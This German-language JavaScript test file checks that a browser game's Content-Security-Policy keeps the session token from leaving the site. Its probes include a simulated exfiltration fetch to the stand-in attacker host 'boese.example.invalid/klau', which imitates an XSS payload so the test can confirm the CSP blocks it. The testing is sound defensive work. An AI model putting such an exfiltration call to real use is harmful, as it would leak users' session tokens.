// Content-Security-Policy: das Sitzungs-Token darf nirgendwohin abfliessen (Sicherheits-Audit
// 18.08.2026, Punkt 5 aus dem Video "Dein Login-Screen. Die offenste Tuer im Haus.").
//
// WAS HIER VERTEIDIGT WIRD
// ------------------------
// Das Token liegt in localStorage und ist damit in JS-Reichweite - eine XSS-Luecke koennte es
// auslesen. Es wurde beim Audit KEINE gefunden (Chat, Nachrichten und Namen laufen durch
// escapeHtml, Spielernamen koennen bauartbedingt kein Markup enthalten), aber bei 56.400 Zeilen
// mit direktem innerHTML-Rendern ist die Frage nicht, ob je eine entsteht. `connect-src 'self'`
// ist die zweite Linie: Auslesen ja, WEGSCHICKEN nein.
//
// Tragfaehig ist das nur, weil das Spiel ausschliesslich mit dem eigenen /api spricht. Genau das
// ist die eigentliche Regel dieses Tests - Pruefung 1c misst sie am Quelltext und faellt, sobald
// jemand einen externen Aufruf einbaut. Dann bricht der naechste Deploy nicht live, sondern hier.
//
// WARUM DER FEHLSCHLAG-GRUND GEPRUEFT WIRD, NICHT NUR "der Aufruf ist gescheitert"
// -------------------------------------------------------------------------------
// Ein von der CSP blockierter fetch wirft einen TypeError. Ein fetch auf eine nicht aufloesbare
// Adresse wirft AUCH einen TypeError. Wer nur auf "hat geworfen" prueft, ist an beiden Staenden
// gruen und belegt nichts (Hausregel 28: eine Pruefung, die aus dem falschen Grund gruen ist, ist
// so schlecht wie eine rote). Gemessen wird deshalb das securitypolicyviolation-Ereignis - das
// feuert ausschliesslich, wenn wirklich die CSP gegriffen hat.
//
// WARUM UEBER HTTP UND NICHT ueber file://
// ----------------------------------------
// Unter file:// ist 'self' eine undurchsichtige Herkunft; "gleiche Herkunft erlaubt" liesse sich
// dort gar nicht messen. Der Test startet deshalb einen winzigen HTTP-Server (Port 3241, im
// Frontend-Repo benutzt sonst kein Test einen Port; die Backend-Suite liegt bei 3195-3219).
//
// DAS PAAR IST DER BELEG, NICHT DIE EINZELPRUEFUNG
// ------------------------------------------------
// 2a (fremde Herkunft blockiert) UND 2b (eigene Herkunft erlaubt) gehoeren zusammen. 2b allein
// waere ohne jede CSP trivial gruen, 2a allein waere auch bei einer viel zu strengen CSP gruen,
// die das Spiel komplett lahmlegt. Erst beide zusammen sagen etwas aus.
//
// GEGENPROBE (beide Richtungen gefahren, Hausregel 1):
//   gruen: node tests/test_csp_verbindung.js
//   rot:   an einer Kopie ohne die beiden meta-Zeilen faellt 1a, 1b, 2a und 3 -
//          KEPLER_SPIELDATEI=/tmp/ohne_csp.html node tests/test_csp_verbindung.js
//          (2b bleibt dort gruen - genau deshalb ist es allein kein Beleg.)
const http = require('http');
const fs = require('fs');
const { starteBrowser, SPIELDATEI, pruefer } = require('./lib/umgebung');
const { check, ende } = pruefer();

const PORT = 3241;
const QUELLE = fs.readFileSync(SPIELDATEI, 'utf8');

// Der Inhalt des CSP-meta-Tags. Bewusst GESCOPT auf das Tag statt auf die ganze Datei: Der
// erklaerende Kommentar darueber nennt "default-src" mehrfach, und ein Patchnote zu dieser
// Auslieferung tut es vermutlich auch. Eine Suche ueber die ganze Datei wuerde den Kommentar
// finden und die Pruefung ins Gegenteil verkehren (Hausregel 33/46).
function cspInhalt() {
  // Das Anfuehrungszeichen des content-Attributs wird gemerkt und nur DIESES ausgeschlossen -
  // der CSP-Wert enthaelt selbst einfache Anfuehrungszeichen ('self'), eine Zeichenklasse
  // [^"']* bricht dort mitten im Wert ab und liefert stillschweigend "connect-src ".
  const m = QUELLE.match(/<meta\s+http-equiv=["']Content-Security-Policy["']\s+content=(["'])([\s\S]*?)\1/i);
  return m ? m[2] : null;
}

function referrerInhalt() {
  const m = QUELLE.match(/<meta\s+name=["']referrer["']\s+content=(["'])([\s\S]*?)\1/i);
  return m ? m[2] : null;
}

// Alle Netzwerkziele des Spiels aus dem Skriptblock. Kommentare werden vorher geleert, sonst
// zaehlt ein Kommentar, der einen Aufruf ZITIERT, wie ein echter Aufruf mit (Hausregel 33).
function netzwerkZiele() {
  const m = QUELLE.match(/<script>([\s\S]*)<\/script>/);
  if (!m) return null;
  const js = m[1]
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:])\/\/[^\n]*/g, '$1');
  const ziele = [];
  const re = /\bfetch\(\s*(['"`])([^'"`]*)\1/g;
  let t;
  while ((t = re.exec(js))) ziele.push(t[2]);
  const andere = [];
  for (const api of ['XMLHttpRequest', 'sendBeacon', 'new WebSocket', 'EventSource']) {
    if (js.includes(api)) andere.push(api);
  }
  return { ziele, andere };
}

(async () => {
  // ---------- 1. Quelltext ----------
  const csp = cspInhalt();
  check('1a: CSP-meta vorhanden und begrenzt connect-src auf die eigene Herkunft',
    !!csp && /connect-src\s+'self'/.test(csp), { csp });

  // Die bewusste Entscheidung, die geschuetzt werden muss: KEIN default-src. Nicht genannte
  // Direktiven fallen nur dann auf default-src zurueck, wenn es eines gibt - ohne bleiben
  // Schrift (Base64-URI), Inline-Stile und der Inline-Skriptblock unberuehrt. Wer hier ein
  // default-src ergaenzt, legt das Spiel still lahm, und zwar erst beim naechsten Deploy.
  check('1b: die CSP fuehrt bewusst KEIN default-src (sonst braechen Schrift, Stile und Skript)',
    !!csp && !/default-src/i.test(csp), { csp });

  const netz = netzwerkZiele();
  const extern = netz ? netz.ziele.filter(z => /^[a-z]+:\/\//i.test(z)) : ['<Skriptblock nicht gefunden>'];
  check('1c: jedes Netzwerkziel des Spiels ist gleicher Herkunft - sonst traegt die CSP nicht',
    !!netz && extern.length === 0 && netz.andere.length === 0,
    { ziele: netz ? netz.ziele.length : 0, extern, andereApis: netz ? netz.andere : null });

  const ref = referrerInhalt();
  // Verify- und Reset-Token stehen in der URL. Verlangt wird die REGEL "Pfad und Abfrage
  // verlassen die Herkunft nicht" (Hausregel 3), nicht eine bestimmte Schreibweise - beide
  // zulaessigen Werte erfuellen sie.
  check('3: referrer-meta verhindert, dass Token aus der URL an fremde Seiten mitreisen',
    ref === 'strict-origin-when-cross-origin' || ref === 'no-referrer' ||
    ref === 'same-origin' || ref === 'strict-origin', { referrer: ref });

  // ---------- 2. Gemessen im echten Browser ----------
  const server = http.createServer((req, res) => {
    if (req.url.startsWith('/api/')) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end('{}');
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(QUELLE);
  });
  await new Promise(r => server.listen(PORT, '127.0.0.1', r));

  const browser = await starteBrowser();
  const seite = await browser.newPage();

  // Mitschnitt der CSP-Verstoesse. Per addInitScript, damit der Zuhoerer VOR dem ersten Skript
  // des Spiels steht und nichts verpasst.
  await seite.addInitScript(() => {
    window.__cspVerstoesse = [];
    document.addEventListener('securitypolicyviolation', e => {
      window.__cspVerstoesse.push({ direktive: e.violatedDirective, ziel: String(e.blockedURI).slice(0, 60) });
    });
  });

  await seite.goto('http://127.0.0.1:' + PORT + '/', { waitUntil: 'domcontentloaded' });

  // Beide Sonden laufen im Seitenkontext, also unter derselben CSP wie ein XSS-Nutzlast es taete.
  const sonde = await seite.evaluate(async () => {
    const lauf = async url => {
      const vorher = window.__cspVerstoesse.length;
      let fehler = null;
      try { await fetch(url, { method: 'GET' }); } catch (e) { fehler = String(e && e.name); }
      await new Promise(r => setTimeout(r, 120)); // das Ereignis kommt asynchron
      return { neueVerstoesse: window.__cspVerstoesse.slice(vorher), fehler };
    };
    return {
      fremd: await lauf('https://boese.example.invalid/klau'),
      eigen: await lauf('/api/sonde')
    };
  });

  const fremdBlockiert = sonde.fremd.neueVerstoesse.some(v => /connect-src/.test(v.direktive));
  check('2a: ein Abfluss an eine FREMDE Herkunft wird von der CSP blockiert',
    fremdBlockiert, sonde.fremd);

  // Gegenrichtung. Ohne sie waere eine viel zu strenge CSP, die das ganze Spiel lahmlegt,
  // genauso "gruen" wie die richtige.
  check('2b: der eigene /api-Aufruf laeuft weiterhin durch (die CSP legt das Spiel nicht lahm)',
    sonde.eigen.neueVerstoesse.length === 0 && sonde.eigen.fehler === null, sonde.eigen);

  // Boot-Gegenprobe: Waehrend das Spiel hochlaeuft, darf kein einziger connect-src-Verstoss
  // auftreten. Das faengt einen Aufruf, den 1c am Quelltext nicht sieht (z. B. eine zur Laufzeit
  // zusammengesetzte Adresse).
  await seite.waitForTimeout(2500);
  const beimBoot = await seite.evaluate(() => window.__cspVerstoesse.filter(v => /connect-src/.test(v.direktive)));
  const echteBootVerstoesse = beimBoot.filter(v => !/boese\.example\.invalid/.test(v.ziel));
  check('2c: beim Hochlaufen des Spiels blockiert die CSP keinen eigenen Aufruf',
    echteBootVerstoesse.length === 0, { verstoesse: echteBootVerstoesse.slice(0, 5) });

  await ende(async () => {
    await browser.close();
    await new Promise(r => server.close(r));
  });
})();
